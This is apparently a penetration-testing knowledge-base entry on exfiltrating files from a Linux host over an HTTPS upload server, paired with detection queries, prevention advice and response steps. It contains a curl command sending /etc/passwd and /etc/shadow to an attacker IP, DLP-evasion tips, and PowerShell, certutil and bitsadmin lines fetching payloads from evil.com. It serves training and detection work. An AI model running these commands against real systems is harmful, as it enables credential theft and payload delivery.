examples.label: CPTS Ch07 - HTTPS uploadserver + curl multi-file upload
examples.command:
# Attacker:
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
# Target:
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure

examples.label: SCP push to attacker SSH server

notes: Exfil loot OFF a Linux box: base64+paste for small files, or an uploadserver/nc for big ones. Prefer an encrypted channel (scp/openssl) on a real engagement so evidence isn't sniffable. uploadserver adds /upload endpoint to Python's built-in HTTP server. Use HTTPS with self-signed cert to encrypt data in transit. SCP requires SSH running on attacker (sudo systemctl enable ssh && sudo systemctl start ssh). Also covered in: CPTS Ch07 (File Transfers).

recommended.note: SCP is the clean encrypted option.

name: Linux - Upload to Attacker (HTTPS)
description: Exfil over an encrypted uploadserver so files (and creds) aren't sent in cleartext. Generate a self-signed cert, run the HTTPS uploadserver, and POST with curl.

steps.label: 1. Cert + HTTPS uploadserver (attacker)
steps.command:
sudo python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

defense.why_it_works: Standard Linux transfer tools (scp/wget/curl over SSH/HTTP) move files onto the target using access you already have; there's no vuln - it's living-off-the-land staging.
defense.prerequisites: Code execution on the target, data to exfil, and an attacker endpoint reachable over an allowed protocol.
defense.impact: Sensitive files leave the environment - a confidentiality breach and material for offline analysis.
defense.detection: Outbound data flows to an external/unknown host, unusual for the source process; DLP/egress monitoring on sensitive content; command line (curl -F / nc) in auditd.
defense.artifacts: An outbound POST/nc/scp to the attacker; the source process's unusual network connection; DLP hits.
defense.splunk_spl:
index=linux sourcetype="linux:auditd" (proctitle="*curl*-F*" OR proctitle="*curl*-T*" OR comm="nc")
| table _time, host, auid, proctitle
defense.sentinel_kql:
DeviceProcessEvents
| where FileName in~ ("curl","nc","ncat") and ProcessCommandLine has_any ("-F ","-T ","POST")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| sort by Timestamp desc
// outbound POST/nc of a sensitive file to an external host (DLP/egress)
defense.sigma_rules: proc_creation_lnx_curl_upload (curl -F/-T exfil to external host - T1048.003)
defense.prevention: [MITRE T1048 M1037] Egress filtering + DLP; restrict which hosts reach the internet; monitor for large/unusual outbound flows.
defense.evasion: Encrypt/compress and chunk data to defeat DLP; exfil over HTTPS/SSH to blend with normal egress.
defense.misconfiguration: Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.
defense.vulnerable_config:
# Living-off-the-land file download methods (all built into Windows/Linux):
# PowerShell (often bypasses older AV):
(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\Temp\shell.exe')

# certutil (trusted Microsoft binary, often not blocked):
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# bitsadmin (background transfer service):
bitsadmin /transfer myJob http://evil.com/shell.exe C:\Temp\shell.exe

# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.
defense.secure_config:
# Application allowlisting (most effective):
# Windows Defender Application Control (WDAC) or AppLocker
# Only signed, approved executables run
# Blocks dropping and running arbitrary payloads even via LOLBins

# PowerShell Constrained Language Mode + AMSI:
# GPO: PowerShell Execution Policy = AllSigned
# Blocks unsigned scripts; AMSI scans all scripts before execution

# Egress filtering - block outbound to unknown IPs:
# Web proxy with allowlist for legitimate update sources
# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)
# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'

# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process
# Defender ATP: 'Suspicious process using Certutil to download content'
defense.code_review:
RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.
  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)
GREP:  grep -rniE "move_uploaded_file|\$_FILES|multer|formidable|MultipartFile|SaveAs\(" .
SAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir.

validation.success_criteria: At least one behavioral detection fires within 60 seconds of attack execution
response_steps: Correlate alert with source host, user account, and timestamp
Review Microsoft Defender for Endpoint, Linux Audit (auditd), Sysmon for surrounding context (5 min before/after)
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

explain:
Exfiltrates a file to your attack box over an encrypted HTTPS uploadserver:
  curl -X POST https://<ip>/upload   POST to the uploadserver's upload endpoint
  -F 'files=@/etc/passwd'            attach the file as multipart form data
  --insecure                         accept the self-signed cert
Uploads the file over TLS so creds are not sent in cleartext; run 'python3 -m uploadserver 443 --server-certificate' on your side first.
